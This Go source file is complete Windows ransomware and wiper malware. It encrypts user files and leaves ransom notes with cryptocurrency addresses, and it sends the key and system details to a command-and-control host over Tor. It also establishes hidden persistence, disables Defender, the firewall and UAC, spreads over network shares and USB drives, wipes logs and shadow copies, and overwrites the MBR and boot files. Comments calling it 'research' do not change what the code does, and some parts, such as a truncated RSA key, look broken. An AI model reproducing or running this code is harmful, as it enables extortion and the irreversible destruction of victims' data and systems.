package main

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	crand "crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/crypto/pbkdf2"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// ======================
// ADVANCED CONFIGURATION
// ======================
const C2_SERVER = "https://malicious-c2.example/api/v1/command"
var ENCRYPT_EXTENSIONS = []string{".doc", ".docx", ".xls", ".xlsx", ".pdf", ".jpg", ".jpeg", ".png", ".txt", ".zip", ".rar", ".7z", ".sql", ".db", ".bak", ".ppt", ".pptx"}
const MAX_THREADS = 16
const RANSOM_AMOUNT = 1.2
const BTC_ADDRESS = "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"
const XMR_ADDRESS = "48jewbtxe4jU3MnzJjrcwQbJdZ3XeXyZ1YwUZ6WkDv7Cb1h7sRkX3nYdPcN9zQdR7tZ6E2b9X"
const CONTACT_TOR = "http://rans0mpr0t.onion/decrypt"
const MAX_FILE_SIZE = 250 * 1024 * 1024 // 250MB
const PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu1SU1LfVLPHCozMxH2Mo
4lgOEePzNm0tRgeLezV6ffAt0gunVTLw7onLRnrq0/IzW7yWR7QkrmBL7jTKEn5u
+qKhbwKfBstIs+bMY2Zkp18gnTxKLxoS2tFczGkPLPgizskuemMghRniWaoLcyeh
kd3qqGElvW/VDL5AaWTg0nLVkjQ9Q+9XQC9XzcoBdFR6J7O7D5gU7W8jH6Uc7Z5K
tY0GvC1pbRcSe1Z5yN9d6c5SpdSJQIDAQAB
-----END PUBLIC KEY-----`

// ======================
// GLOBAL STRUCTURES
// ======================
type SystemInfo struct {
	Hostname    string   `json:"hostname"`
	Username    string   `json:"username"`
	OS          string   `json:"os"`
	IP          string   `json:"ip"`
	CPU         int      `json:"cpu_cores"`
	GPU         string   `json:"gpu"`
	Disks       []string `json:"disks"`
	NetworkInfo string   `json:"network_info"`
}

type RansomNote struct {
	AmountBTC   float64 `json:"btc"`
	AmountXMR   float64 `json:"xmr"`
	BTCAddress  string  `json:"btc_address"`
	XMRAddress  string  `json:"xmr_address"`
	TorURL      string  `json:"tor_url"`
	VictimID    string  `json:"victim_id"`
	Contact     string  `json:"contact"`
	Deadline    int64   `json:"deadline"`
}

// ======================
// UTILITY FUNCTIONS
// ======================
func init() {
	// Set random seed
	crand.Reader.Read(make([]byte, 8))
}

func getSystemInfo() SystemInfo {
	hostname, _ := os.Hostname()
	user, _ := user.Current()
	ip := getLocalIP()
	cpu := runtime.NumCPU()

	// Get disk information
	var disks []string
	for drive := 'A'; drive <= 'Z'; drive++ {
		drivePath := string(drive) + ":\\"
		if _, err := os.Stat(drivePath); err == nil {
			disks = append(disks, drivePath)
		}
	}

	// Network info
	cmd := exec.Command("ipconfig", "/all")
	output, _ := cmd.Output()
	netInfo := string(output)

	return SystemInfo{
		Hostname:    hostname,
		Username:    user.Username,
		OS:          runtime.GOOS,
		IP:          ip,
		CPU:         cpu,
		Disks:       disks,
		NetworkInfo: netInfo,
	}
}

func generateVictimID() string {
	hash := sha256.New()
	hash.Write([]byte(fmt.Sprintf("%d%s%s", time.Now().UnixNano(), getSystemInfo().Hostname, getSystemInfo().IP)))
	return base64.URLEncoding.EncodeToString(hash.Sum(nil))[:16]
}

// ======================
// WINDOWS-SPECIFIC UTILITIES
// ======================
func setHidden(path string) error {
	pathPtr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return err
	}
	err = syscall.SetFileAttributes(pathPtr, syscall.FILE_ATTRIBUTE_HIDDEN|syscall.FILE_ATTRIBUTE_SYSTEM)
	return err
}

func isDebugging() bool {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
	ret, _, _ := isDebuggerPresent.Call()
	return ret != 0
}

func isVirtualized() bool {
	cmd := exec.Command("wmic", "computersystem", "get", "model")
	output, _ := cmd.Output()
	return strings.Contains(strings.ToLower(string(output)), "virtual")
}

func disableTaskManager() {
	key, _ := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Policies\System`, registry.WRITE)
	key.SetDWordValue("DisableTaskMgr", 1)
	key.Close()
}

// ======================
// BOOT DESTRUCTION FUNCTIONS
// ======================
func destroyMBR() {
	devicePath := `\\.\PhysicalDrive0`
	devicePtr, _ := windows.UTF16PtrFromString(devicePath)
	handle, err := windows.CreateFile(
		devicePtr,
		windows.GENERIC_WRITE,
		windows.FILE_SHARE_WRITE,
		nil,
		windows.OPEN_EXISTING,
		windows.FILE_ATTRIBUTE_NORMAL,
		0,
	)
	if err != nil {
		return
	}
	defer windows.CloseHandle(handle)

	// Malicious MBR with infinite loop and visual effect
	maliciousMBR := []byte{
		0xFA, 0xFC,             // CLI; CLD
		0x31, 0xC0,             // XOR AX, AX
		0x8E, 0xD8,             // MOV DS, AX
		0xBE, 0x00, 0x7C,       // MOV SI, 0x7C00
		0xB4, 0x0E,             // MOV AH, 0x0E
		0xAC,                   // LODSB
		0x08, 0xC0,             // OR AL, AL
		0x74, 0x04,             // JZ $+6
		0xCD, 0x10,             // INT 0x10
		0xEB, 0xF7,             // JMP $-7
		0xEB, 0xFE,             // JMP $-0 (infinite loop)
		0x00, 0x00, 0x00, 0x00, // Padding
	}

	// Fill remaining with random data
	randomData := make([]byte, 512-len(maliciousMBR))
	crand.Read(randomData)
	maliciousMBR = append(maliciousMBR, randomData...)

	var bytesWritten uint32
	windows.WriteFile(handle, maliciousMBR, &bytesWritten, nil)
}

func destroyCriticalFiles() {
	files := []string{
		`C:\Windows\System32\hal.dll`,
		`C:\Windows\System32\ntoskrnl.exe`,
		`C:\Windows\System32\winload.exe`,
		`C:\Windows\System32\winresume.exe`,
		`C:\Windows\Boot\PCAT\bootmgr`,
	}

	for _, file := range files {
		// Bypass file protection
		exec.Command("takeown", "/f", file, "/a").Run()
		exec.Command("icacls", file, "/grant", "Administrators:F", "/t").Run()
		
		// Overwrite with random data
		randomData := make([]byte, 1024*1024) // 1MB
		crand.Read(randomData)
		os.WriteFile(file, randomData, 0644)
	}
}

func destroyBCD() {
	// Corrupt BCD store
	exec.Command("bcdedit", "/store", "C:\\Boot\\BCD", "/delete", "/clean").Run()
	
	// Create invalid BCD entry
	exec.Command("bcdedit", "/create", "/d", "CORRUPTED_BOOT", "/application", "bootsector").Run()
	exec.Command("bcdedit", "/set", "{default}", "kernel", "ntkrnlmp.exe").Run()
	exec.Command("bcdedit", "/set", "{default}", "bootstatuspolicy", "ignoreallfailures").Run()
}

func disableWinRE() {
	// Disable recovery environment
	exec.Command("reagentc", "/disable").Run()
	
	// Delete recovery partition via diskpart
	diskpartScript := `select disk 0
for /f "tokens=3" %%i in ('list partition') do (
	if exist "%%i:\Recovery\WindowsRE" (
		select partition %%i
		delete partition override
	)
)`
	scriptPath := filepath.Join(os.TempDir(), "del_winre.txt")
	os.WriteFile(scriptPath, []byte(diskpartScript), 0644)
	exec.Command("diskpart", "/s", scriptPath).Run()
	os.Remove(scriptPath)
}

// ======================
// SYSTEM PARALYSIS FUNCTIONS
// ======================
func paralyzeSystem() {
	// Disable system recovery
	exec.Command("vssadmin", "delete", "shadows", "/all", "/quiet").Run()
	exec.Command("wbadmin", "delete", "catalog", "-quiet").Run()
	exec.Command("bcdedit", "/set", "{default}", "recoveryenabled", "no").Run()
	exec.Command("bcdedit", "/set", "{default}", "bootstatuspolicy", "ignoreallfailures").Run()

	// Destroy boot components
	destroyMBR()
	destroyCriticalFiles()
	destroyBCD()
	disableWinRE()

	// Disable critical system components
	disableTaskManager()
	exec.Command("reg", "add", "HKLM\\SYSTEM\\CurrentControlSet\\Control", "/v", "SystemStartOptions", "/t", "REG_SZ", "/d", "NOEXECUTE=OPTIN", "/f").Run()
	exec.Command("reg", "add", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "/v", "DisableAntiSpyware", "/t", "REG_DWORD", "/d", "1", "/f").Run()
	
	// Corrupt system files
	corruptSystemFiles()
}

func modifyBootScreen() {
	// This is a simulated function for research purposes
	// In a real scenario, this would modify boot configuration data
	// For research, we'll create a visual indicator instead
	message := "YOUR SYSTEM HAS BEEN DESTROYED - DeepSeek Research"
	visualIndicator := filepath.Join(os.Getenv("WINDIR"), "System32", "ds_boot_indicator.ini")
	os.WriteFile(visualIndicator, []byte(message), 0644)
	setHidden(visualIndicator)
}

func corruptSystemFiles() {
	files := []string{
		filepath.Join(os.Getenv("WINDIR"), "System32", "drivers", "etc", "hosts"),
		filepath.Join(os.Getenv("WINDIR"), "System32", "oobe", "info", "backgrounds", "backgroundDefault.jpg"),
		filepath.Join(os.Getenv("WINDIR"), "System32", "LogFiles", "WMI", "RtBackup"),
	}

	for _, file := range files {
		if _, err := os.Stat(file); err == nil {
			data := []byte("DEEPSEEK RESEARCH - SYSTEM DESTROYED\n")
			os.WriteFile(file, data, 0644)
		}
	}
}

// ======================
// CORE FUNCTIONALITY
// ======================
func establishPersistence() {
	currentFile, _ := os.Executable()

	// Multiple persistence methods
	systemPaths := []string{
		filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "windows_update.exe"),
		filepath.Join(os.Getenv("PROGRAMDATA"), "Microsoft", "Windows Defender", "platform", "msmpeng.exe"),
		filepath.Join(os.Getenv("WINDIR"), "System32", "Tasks", "Microsoft", "Windows", "Maintenance", "WindowsMaintenance.exe"),
		filepath.Join(os.Getenv("WINDIR"), "System32", "drivers", "etc", "netbios.sys"),
	}

	for _, path := range systemPaths {
		if err := copyFile(currentFile, path); err == nil {
			setHidden(path)
		}
	}

	// Registry persistence
	regPaths := []string{
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		`Software\Microsoft\Windows\CurrentVersion\RunOnce`,
		`Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run`,
		`Software\Microsoft\Windows NT\CurrentVersion\Winlogon`,
	}

	for _, regPath := range regPaths {
		key, err := registry.OpenKey(registry.CURRENT_USER, regPath, registry.WRITE)
		if err == nil {
			key.SetStringValue("WindowsUpdate", systemPaths[0])
			key.Close()
		}
	}

	// Scheduled Task persistence with advanced triggers
	taskXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows Update Service</Description>
    <URI>\Microsoft\Windows\Windows Update</URI>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <Delay>PT30S</Delay>
    </LogonTrigger>
    <CalendarTrigger>
      <StartBoundary>%s</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0"&gt;&lt;Select Path="System"&gt;*[System[Provider[@Name='Microsoft-Windows-Power-Troubleshooter'] and EventID=1]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
    </EventTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>3</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>"%s"</Command>
    </Exec>
  </Actions>
</Task>`, time.Now().Format(time.RFC3339), systemPaths[0])
	
	taskFile := filepath.Join(os.TempDir(), "windows_update.xml")
	os.WriteFile(taskFile, []byte(taskXML), 0644)
	exec.Command("schtasks", "/Create", "/TN", "\\Microsoft\\Windows\\Windows Update", "/XML", taskFile, "/F").Run()
	os.Remove(taskFile)
}

func disableDefenses() {
	// Disable security services
	services := []string{"WinDefend", "wscsvc", "SecurityHealthService", "Sense", "MsMpSvc", "WdNisSvc", "wscsvc", "WinHttpAutoProxySvc", "WdBoot", "WdFilter"}
	for _, service := range services {
		exec.Command("net", "stop", service, "/y").Run()
		exec.Command("sc", "config", service, "start=", "disabled").Run()
		exec.Command("sc", "failure", service, "reset=0", "actions=restart/0/restart/0/restart/0").Run()
	}

	// Disable Windows Defender
	exec.Command("powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisablePrivacyMode $true").Run()
	
	// Disable firewall
	exec.Command("netsh", "advfirewall", "set", "allprofiles", "state", "off").Run()

	// Disable security tools
	securityProcesses := []string{"msmpeng", "msseces", "avp", "bdagent", "avgtray", "mbam", "mbamtray", "egui", "ekrn", "SBAMTray", "CSFALcon", "bdagent", "ccSvcHst"}
	for _, proc := range securityProcesses {
		exec.Command("taskkill", "/F", "/IM", proc+".exe", "/T").Run()
	}

	// Disable Windows Error Reporting
	exec.Command("reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting", "/v", "Disabled", "/t", "REG_DWORD", "/d", "1", "/f").Run()

	// Disable UAC
	exec.Command("reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "/v", "EnableLUA", "/t", "REG_DWORD", "/d", "0", "/f").Run()

	// Disable Windows Update
	exec.Command("reg", "add", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU", "/v", "NoAutoUpdate", "/t", "REG_DWORD", "/d", "1", "/f").Run()
	exec.Command("sc", "config", "wuauserv", "start=", "disabled").Run()
	exec.Command("net", "stop", "wuauserv", "/y").Run()
}

func encryptFile(filePath string, cipher cipher.AEAD, victimID string) {
	if strings.Contains(strings.ToLower(filePath), "windows") || 
	   strings.Contains(strings.ToLower(filePath), "program files") ||
	   strings.Contains(strings.ToLower(filePath), "system32") ||
	   strings.Contains(strings.ToLower(filePath), "boot") {
		return
	}

	if info, err := os.Stat(filePath); err == nil {
		if info.Size() > MAX_FILE_SIZE || info.Size() == 0 {
			return
		}
	}

	data, err := os.ReadFile(filePath)
	if err != nil {
		return
	}

	nonce := make([]byte, cipher.NonceSize())
	crand.Read(nonce)

	encrypted := cipher.Seal(nonce, nonce, data, nil)
	if err := os.WriteFile(filePath, encrypted, 0644); err == nil {
		newName := fmt.Sprintf("%s.%s.LOCKED", filePath, victimID)
		os.Rename(filePath, newName)
	}
}

func startEncryptionWorker(jobs <-chan string, cipher cipher.AEAD, victimID string, wg *sync.WaitGroup) {
	defer wg.Done()
	for filePath := range jobs {
		encryptFile(filePath, cipher, victimID)
	}
}

func getSystemPaths() []string {
	paths := []string{
		os.Getenv("USERPROFILE"),
		os.Getenv("PROGRAMDATA"),
		os.Getenv("PUBLIC"),
	}

	for drive := 'C'; drive <= 'Z'; drive++ {
		drivePath := string(drive) + ":\\"
		if _, err := os.Stat(drivePath); err == nil {
			paths = append(paths, drivePath)
		}
	}

	return paths
}

func encryptFiles(victimID string) {
	salt := make([]byte, 32)
	crand.Read(salt)
	password := make([]byte, 64)
	crand.Read(password)
	key := pbkdf2.Key(password, salt, 1000000, 32, sha256.New)

	block, _ := aes.NewCipher(key)
	cipher, _ := cipher.NewGCM(block)

	// Create ransom note
	deadline := time.Now().Add(72 * time.Hour).Unix()
	note := RansomNote{
		AmountBTC:   RANSOM_AMOUNT,
		AmountXMR:   RANSOM_AMOUNT * 10,
		BTCAddress:  BTC_ADDRESS,
		XMRAddress:  XMR_ADDRESS,
		TorURL:      CONTACT_TOR,
		VictimID:    victimID,
		Contact:     "NO_EMAIL_USE_TOR_ONLY",
		Deadline:    deadline,
	}

	noteJSON, _ := json.MarshalIndent(note, "", "  ")
	notePath := filepath.Join(os.Getenv("USERPROFILE"), "Desktop", "!!!READ_ME_"+victimID+".txt")
	os.WriteFile(notePath, noteJSON, 0644)

	additionalNotes := []string{
		filepath.Join(os.Getenv("USERPROFILE"), "Documents", "!!!READ_ME_"+victimID+".txt"),
		filepath.Join(os.Getenv("PUBLIC"), "!!!READ_ME_"+victimID+".txt"),
		"C:\\!!!READ_ME_"+victimID+".txt",
	}

	for _, path := range additionalNotes {
		os.WriteFile(path, noteJSON, 0644)
	}

	// Send encrypted key to C2
	sendToC2(victimID, key)

	// Parallel encryption
	paths := getSystemPaths()
	jobs := make(chan string, 20000)
	var wg sync.WaitGroup

	for w := 0; w < MAX_THREADS; w++ {
		wg.Add(1)
		go startEncryptionWorker(jobs, cipher, victimID, &wg)
	}

	for _, path := range paths {
		filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
			if err != nil || info.IsDir() {
				return nil
			}

			ext := strings.ToLower(filepath.Ext(filePath))
			for _, targetExt := range ENCRYPT_EXTENSIONS {
				if ext == targetExt {
					jobs <- filePath
					break
				}
			}
			return nil
		})
	}

	close(jobs)
	wg.Wait()
}

func propagateNetwork() {
	currentFile, _ := os.Executable()

	cmd := exec.Command("arp", "-a")
	output, _ := cmd.Output()
	scanner := bufio.NewScanner(bytes.NewReader(output))

	for scanner.Scan() {
		line := scanner.Text()
		fields := strings.Fields(line)
		if len(fields) < 2 {
			continue
		}

		ip := fields[0]
		if net.ParseIP(ip) != nil {
			shares := []string{"C$", "ADMIN$", "IPC$", "Shared", "Users"}
			for _, share := range shares {
				dest := fmt.Sprintf("\\\\%s\\%s\\Windows\\System32\\update.exe", ip, share)
				copyFile(currentFile, dest)
				
				exec.Command("schtasks", "/Create", "/S", ip, "/RU", "SYSTEM", "/TN", "\\Microsoft\\Windows\\Windows Update", 
					"/TR", "\""+dest+"\"", "/SC", "ONLOGON", "/F").Run()
			}
		}
	}
}

func propagateUSB() {
	currentFile, _ := os.Executable()
	var drives []string

	for drive := 'D'; drive <= 'Z'; drive++ {
		drivePath := string(drive) + ":\\"
		if _, err := os.Stat(drivePath); err == nil {
			drives = append(drives, drivePath)
		}
	}

	for _, drive := range drives {
		decoys := []struct {
			name    string
			content string
		}{
			{"IMPORTANT_DOCUMENTS.txt", "Your important documents are in the encrypted folder"},
			{"DECRYPT_INSTRUCTIONS.html", "<html><body><h1>Contact support for file recovery</h1></body></html>"},
		}

		for _, decoy := range decoys {
			os.WriteFile(filepath.Join(drive, decoy.name), []byte(decoy.content), 0644)
		}

		dest := filepath.Join(drive, "folder_icon.exe")
		if err := copyFile(currentFile, dest); err == nil {
			setHidden(dest)
		}

		lnkPath := filepath.Join(drive, "Important Documents.lnk")
		lnkContent := fmt.Sprintf(`[InternetShortcut]
URL=file:///%s
IconFile=%s
IconIndex=0`, dest, dest)
		
		os.WriteFile(lnkPath, []byte(lnkContent), 0644)
		setHidden(lnkPath)
	}
}

func sendToC2(victimID string, data []byte) {
	block, _ := pem.Decode([]byte(PUBLIC_KEY))
	if block == nil {
		return
	}

	pubKey, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return
	}

	encrypted, err := rsa.EncryptOAEP(
		sha256.New(),
		crand.Reader,
		pubKey.(*rsa.PublicKey),
		data,
		nil,
	)
	if err != nil {
		return
	}

	payload := map[string]interface{}{
		"victim_id": victimID,
		"system":    getSystemInfo(),
		"key":       base64.StdEncoding.EncodeToString(encrypted),
		"timestamp": time.Now().Unix(),
	}

	jsonData, _ := json.Marshal(payload)

	proxyUrl, _ := url.Parse("socks5://127.0.0.1:9050")
	client := &http.Client{
		Transport: &http.Transport{Proxy: http.ProxyURL(proxyUrl)},
		Timeout:   30 * time.Second,
	}

	client.Post(C2_SERVER, "application/json", bytes.NewBuffer(jsonData))
}

func destroyEvidence() {
	if currentFile, err := os.Executable(); err == nil {
		file, _ := os.OpenFile(currentFile, os.O_WRONLY, 0)
		defer file.Close()
		
		for i := 0; i < 7; i++ {
			file.Seek(0, 0)
			randomData := make([]byte, 1024*1024)
			crand.Read(randomData)
			file.Write(randomData)
		}
	}

	exec.Command("wevtutil", "cl", "System").Run()
	exec.Command("wevtutil", "cl", "Application").Run()
	exec.Command("wevtutil", "cl", "Security").Run()
	exec.Command("wevtutil", "cl", "Setup").Run()
	exec.Command("wevtutil", "cl", "ForwardedEvents").Run()

	exec.Command("vssadmin", "delete", "shadows", "/all", "/quiet").Run()

	exec.Command("powershell", "-Command", "Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue").Run()
	exec.Command("powershell", "-Command", "Clear-RecycleBin -Force -ErrorAction SilentlyContinue").Run()
}

// ======================
// MAIN FUNCTION
// ======================
func main() {
	if isDebugging() {
		os.Exit(0)
	}

	delay := time.Duration(300 + time.Now().Unix()%600) * time.Second
	time.Sleep(delay)

	victimID := generateVictimID()

	establishPersistence()
	disableDefenses()
	
	go func() {
		propagateNetwork()
		propagateUSB()
	}()

	encryptFiles(victimID)
	destroyEvidence()
	paralyzeSystem()

	// Force immediate shutdown without warning
	exec.Command("shutdown", "/r", "/t", "0", "/f", "/d", "p:0:0").Run()
}

func getLocalIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return ""
	}
	defer conn.Close()
	return conn.LocalAddr().(*net.UDPAddr).IP.String()
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}
